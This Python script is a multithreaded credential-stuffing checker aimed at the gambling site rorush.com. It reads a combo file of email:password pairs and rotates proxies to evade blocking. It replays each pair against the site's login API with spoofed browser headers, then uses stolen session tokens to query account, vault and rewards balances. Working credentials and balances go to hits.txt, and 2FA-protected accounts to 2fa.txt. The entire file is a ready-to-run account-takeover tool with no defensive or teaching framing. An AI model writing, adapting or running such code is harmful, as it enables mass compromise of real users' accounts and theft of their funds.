import sys
import time
import requests
import threading
import itertools
import os
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

R = '\033[0m'
B = '\033[1m'
DM = '\033[2m'
GR = '\033[92m'
RD = '\033[91m'
AM = '\033[93m'
CY = '\033[96m'
WH = '\033[97m'
MU = '\033[90m'

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')


class UI:
    def __init__(self, total):
        self.total = total
        self.done = 0
        self.valid = 0
        self.invalid = 0
        self.errors = 0
        self.twofa = 0
        self.lock = threading.Lock()
        self.stop = False
        self.spinner = itertools.cycle(['|', '/', '-', '\\'])

    def record_result(self, v=0, i=0, e=0, f=0):
        with self.lock:
            self.done += 1
            self.valid += v
            self.invalid += i
            self.errors += e
            self.twofa += f

    def log(self, text):
        with self.lock:
            sys.stdout.write(f"\r{' ' * 80}\r")
            sys.stdout.write(text + "\n")
            sys.stdout.flush()

    def draw(self):
        while not self.stop:
            with self.lock:
                spin = next(self.spinner)
                pct = self.done / self.total if self.total > 0 else 0
                filled = int(30 * pct)
                empty = 30 - filled

                bar = f"{MU}▐{GR}{'█' * filled}{MU}{'░' * empty}▌{R}"
                stats = f"{WH}{self.done}{MU}/{WH}{self.total}{R}  "
                stats += f"{GR}+{self.valid}{R}  "
                stats += f"{RD}-{self.invalid}{R}  "
                stats += f"{AM}!{self.errors}{R}  "
                stats += f"{CY}2fa:{self.twofa}{R} "

                line = f"\r{GR}{spin}{R} {bar} {stats}"
                sys.stdout.write(line + "  " * 20)
                sys.stdout.flush()
            time.sleep(0.1)


def log_valid(ui, username, bal, wag, lvl, vault_bal, rb_daily, t):
    text = f"\r{GR}+{R} {B}{WH}{username:<28}{R} {MU}bal={R}{WH}{bal:>10.2f}{R} {MU}wag={R}{WH}{wag:>12.2f}{R} {MU}lvl={R}{WH}{lvl:>3d}{R} {MU}vault={R}{WH}{vault_bal:>8.2f}{R} {MU}rb={R}{WH}{rb_daily:>6.4f}{R} {DM}[{t:.1f}s]{R}"
    ui.log(text)


def log_invalid(ui, username, reason):
    text = f"\r{RD}-{R} {RD}{username:<28}{R} {MU}{reason}{R}"
    ui.log(text)


def log_twofa(ui, username):
    text = f"\r{CY}2{R} {CY}{username:<28}{R} {MU}2fa enabled{R}"
    ui.log(text)


def log_error(ui, username, err):
    err_short = err[:30]
    text = f"\r{AM}!{R} {AM}{username:<28}{R} {MU}error{R} {DM}({err_short}){R}"
    ui.log(text)


def get_input(label, default=None, cast=str):
    while True:
        try:
            if default is not None:
                val = input(f"  {MU}{label}{R} {DM}(default {default}) >{R} ").strip()
                if not val:
                    return default
            else:
                val = input(f"  {MU}{label}{R} {DM}>{R} ").strip()
                if not val:
                    print(f"  {RD}no input given{R}")
                    continue

            if cast == int:
                return int(float(val))
            return cast(val)
        except ValueError:
            print(f"  {RD}invalid input{R}")


def setup():
    print(f"  {MU}combo file{R} {DM}>{R} ", end="")
    acc_file = input().strip()
    if not acc_file:
        print(f"  {RD}no file given, exiting{R}")
        sys.exit(1)
    path = Path(acc_file)
    if not path.exists():
        print(f"  {RD}not found:{R} {WH}{acc_file}{R}")
        sys.exit(1)

    threads = get_input("threads", 24, int)
    retries = get_input("retries (0 for unlimited)", 5, int)
    if retries == 0:
        print(f"  {MU}retries set to:{R} {WH}unlimited{R}")

    return path, threads, retries


def load_proxies():
    p_path = Path("proxies.txt")
    if not p_path.exists():
        print(f"  {RD}proxies.txt not found. proxies are required.{R}")
        sys.exit(1)
    raw_proxies = []
    with open(p_path, "r", encoding="utf-8") as f:
        raw_proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    if not raw_proxies:
        print(f"  {RD}proxies.txt is empty. proxies are required.{R}")
        sys.exit(1)

    proxies = []
    for raw in raw_proxies:
        if "://" in raw:
            proxies.append(raw)
        elif "@" in raw:
            proxies.append(f"http://{raw}")
        else:
            parts = raw.split(":")
            if len(parts) == 4:
                try:
                    int(parts[1])
                    host, port, user, pwd = parts
                    proxies.append(f"http://{user}:{pwd}@{host}:{port}")
                except ValueError:
                    user, pwd, host, port = parts
                    proxies.append(f"http://{user}:{pwd}@{host}:{port}")
            elif len(parts) == 2:
                proxies.append(f"http://{parts[0]}:{parts[1]}")
            else:
                proxies.append(f"http://{raw}")

    return proxies


def print_summary(total, threads, retries):
    r_str = "unlimited" if retries == 0 else str(retries)
    print(f"  {B}{WH}{total}{R} {MU}accounts{R} {DM}|{R} {B}{WH}{threads}{R} {MU}threads{R} {DM}|{R} {MU}retries:{R} {B}{WH}{r_str}{R}")


def try_login(username, password, proxy_dict):
    session = requests.Session()
    payload = {"email": username, "password": password}

    try:
        resp = session.post(
            "https://api.rorush.com/api/v1/auth/login-email",
            json=payload,
            headers={
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Origin": "https://rorush.com",
                "Referer": "https://rorush.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
                "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "x-sec-rush": "836457212",
                "x-api-key": "",
            },
            proxies=proxy_dict,
            timeout=30
        )
    except requests.RequestException as e:
        return {"success": False, "error": str(e), "retryable": True}

    if resp.status_code != 200:
        try:
            body = resp.json()
        except Exception:
            body = {}
        error = body.get("message", body.get("title", ""))
        error_code = body.get("errorCode", 0)

        if error_code in (10, 11):
            return {"success": False, "error": "bad credentials", "retryable": False}

        if resp.status_code == 400:
            validation_errors = body.get("errors", {})
            err_detail = str(validation_errors) if validation_errors else error
            return {"success": False, "error": f"validation: {err_detail}", "retryable": False}

        if resp.status_code == 404:
            return {"success": False, "error": "not found (404)", "retryable": False}

        return {"success": False, "error": error or f"HTTP {resp.status_code} (code {error_code})", "retryable": True}

    try:
        body = resp.json()
    except Exception:
        return {"success": False, "error": "bad JSON response", "retryable": True}

    user_info = body.get("userInfo", {})
    two_factor_token = body.get("twoFactorToken")

    if not user_info:
        if two_factor_token:
            return {"success": False, "error": "2FA enabled", "retryable": False, "twofa": True}
        return {"success": False, "error": "empty userInfo", "retryable": False}

    jwt_token = user_info.get("jwtToken", "")
    display_name = user_info.get("displayName", username)
    level = user_info.get("level", 0) or 0
    balance = (user_info.get("cryptoBalance", 0) or 0) / 1000000
    robux_balance = (user_info.get("robuxBalance", 0) or 0) / 1000000

    vault_balance = 0
    wagered = 0
    rakeback_earned = 0
    rakeback_daily = 0
    rakeback_weekly = 0
    rakeback_monthly = 0
    rain_rewards = 0
    total_rewards = 0

    if jwt_token:
        try:
            vault_resp = session.get(
                "https://api.rorush.com/api/v1/vault/info",
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Origin": "https://rorush.com",
                    "Referer": "https://rorush.com/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
                    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "x-sec-rush": "836457212",
                    "x-api-key": "",
                    "Authorization": f"Bearer {jwt_token}",
                },
                proxies=proxy_dict,
                timeout=15
            )
            if vault_resp.status_code == 200:
                vault_body = vault_resp.json()
                vault_balance = (vault_body.get("balance", 0) or 0) / 1000000
        except Exception:
            pass

        try:
            rakeback_resp = session.get(
                "https://api.rorush.com/api/v1/rewards/rakeback/info",
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Origin": "https://rorush.com",
                    "Referer": "https://rorush.com/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
                    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "x-sec-rush": "836457212",
                    "x-api-key": "",
                    "Authorization": f"Bearer {jwt_token}",
                },
                proxies=proxy_dict,
                timeout=15
            )
            if rakeback_resp.status_code == 200:
                rakeback_body = rakeback_resp.json()
                rakeback_daily = (rakeback_body.get("dailyAmount", 0) or 0) / 1000000
                rakeback_weekly = (rakeback_body.get("weeklyAmount", 0) or 0) / 1000000
                rakeback_monthly = (rakeback_body.get("monthlyAmount", 0) or 0) / 1000000
        except Exception:
            pass

        try:
            rewards_resp = session.get(
                "https://api.rorush.com/api/v1/rewards/seasons",
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Origin": "https://rorush.com",
                    "Referer": "https://rorush.com/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
                    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "x-sec-rush": "836457212",
                    "x-api-key": "",
                    "Authorization": f"Bearer {jwt_token}",
                },
                proxies=proxy_dict,
                timeout=15
            )
            if rewards_resp.status_code == 200:
                rewards_body = rewards_resp.json()
                stats = rewards_body.get("userStats", {})
                wagered = (stats.get("seasonWagered", 0) or 0) / 1000000
                rakeback_earned = (stats.get("rakebackRewards", 0) or 0) / 1000000
                rain_rewards = (stats.get("rainRewards", 0) or 0) / 1000000
                total_rewards = (stats.get("totalRewards", 0) or 0) / 1000000
        except Exception:
            pass

    return {
        "success": True,
        "display_name": display_name,
        "balance": balance,
        "robux_balance": robux_balance,
        "vault_balance": vault_balance,
        "total_balance": balance + vault_balance,
        "wagered": wagered,
        "level": level,
        "rakeback_daily": rakeback_daily,
        "rakeback_weekly": rakeback_weekly,
        "rakeback_monthly": rakeback_monthly,
        "rakeback_earned": rakeback_earned,
        "rain_rewards": rain_rewards,
        "total_rewards": total_rewards,
        "retryable": False
    }


def check_account(args, ui, proxy_cycle, output_lock, max_retries):
    idx, total, username, password = args
    start_t = time.time()
    attempt = 1

    while True:
        if max_retries > 0 and attempt > max_retries:
            log_error(ui, username, "max retries")
            ui.record_result(e=1)
            return

        proxy = next(proxy_cycle)
        proxy_dict = {"http": proxy, "https": proxy}

        result = try_login(username, password, proxy_dict)

        if result["success"]:
            t = time.time() - start_t
            log_valid(ui, result["display_name"], result["balance"], result["wagered"],
                      result["level"], result["vault_balance"], result["rakeback_daily"], t)
            line = (
                f"{username}:{password} | "
                f"Name = {result['display_name']} | "
                f"Balance = {result['balance']:.2f} | "
                f"Vault = {result['vault_balance']:.2f} | "
                f"Total = {result['total_balance']:.2f} | "
                f"Wagered = {result['wagered']:.2f} | "
                f"Level = {result['level']} | "
                f"RBDaily = {result['rakeback_daily']:.4f} | "
                f"RBWeekly = {result['rakeback_weekly']:.4f} | "
                f"RBMonthly = {result['rakeback_monthly']:.4f} | "
                f"RBEarned = {result['rakeback_earned']:.2f} | "
                f"Rain = {result['rain_rewards']:.2f} | "
                f"TotalRewards = {result['total_rewards']:.2f} | "
                f"Robux = {result['robux_balance']:.2f}"
            )
            with output_lock:
                with open("hits.txt", "a", encoding="utf-8") as f:
                    f.write(line + "\n")
            ui.record_result(v=1)
            return
        elif result.get("twofa"):
            log_twofa(ui, username)
            with output_lock:
                with open("2fa.txt", "a", encoding="utf-8") as f:
                    f.write(f"{username}:{password}\n")
            ui.record_result(f=1)
            return
        elif not result["retryable"]:
            err = result["error"]
            reason = "bad credentials"
            if "not found" in err.lower():
                reason = "not found"
            elif "2FA" in err:
                reason = "2FA"
            elif "empty userInfo" in err:
                reason = "no data"
            elif "validation" in err:
                reason = "bad format"
            log_invalid(ui, username, reason)
            ui.record_result(i=1)
            return
        else:
            attempt += 1


def final_summary(ui):
    print(f"  {GR}{B}done{R} {DM}|{R} {GR}{B}+{ui.valid}{R} {MU}hits{R} {DM}|{R} {RD}-{ui.invalid}{R} {MU}invalid{R} {DM}|{R} {CY}2fa:{ui.twofa}{R} {DM}|{R} {AM}!{ui.errors}{R} {MU}errors{R}")
    print(f"  {CY}-> hits.txt, 2fa.txt{R}")


def main():
    ui = None
    try:
        acc_path, threads, retries = setup()
        proxies = load_proxies()
        proxy_cycle = itertools.cycle(proxies)

        print(f"  {GR}loaded{R} {B}{WH}{len(proxies)}{R} {MU}proxies{R}")

        accounts = []
        with open(acc_path, "r", encoding="utf-8-sig") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    u, p = line.split(":", 1)
                    u, p = u.strip(), p.strip()
                    if u and p:
                        accounts.append((u, p))

        total = len(accounts)
        print_summary(total, threads, retries)

        ui = UI(total)
        draw_thread = threading.Thread(target=ui.draw, daemon=True)
        draw_thread.start()

        output_lock = threading.Lock()
        tasks = [(i + 1, total, u, p) for i, (u, p) in enumerate(accounts)]

        executor = ThreadPoolExecutor(max_workers=threads)
        try:
            futures = [executor.submit(check_account, t, ui, proxy_cycle, output_lock, retries) for t in tasks]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    ui.record_result(e=1)
        except KeyboardInterrupt:
            print(f"\n  {RD}Ctrl+C, shutting down...{R}")
            executor.shutdown(wait=False, cancel_futures=True)
            ui.stop = True
            time.sleep(0.2)
            sys.stdout.write(f"\r{' ' * 80}\r")
            final_summary(ui)
            return
    finally:
        if ui:
            ui.stop = True


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {RD}Ctrl+C during setup, exiting...{R}")
    finally:
        try:
            devnull_fd = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull_fd, 1)
            os.dup2(devnull_fd, 2)
            os.close(devnull_fd)
            sys.stdout = open(os.devnull, 'w')
            sys.stderr = sys.stdout
        except Exception:
            pass
        os._exit(0)
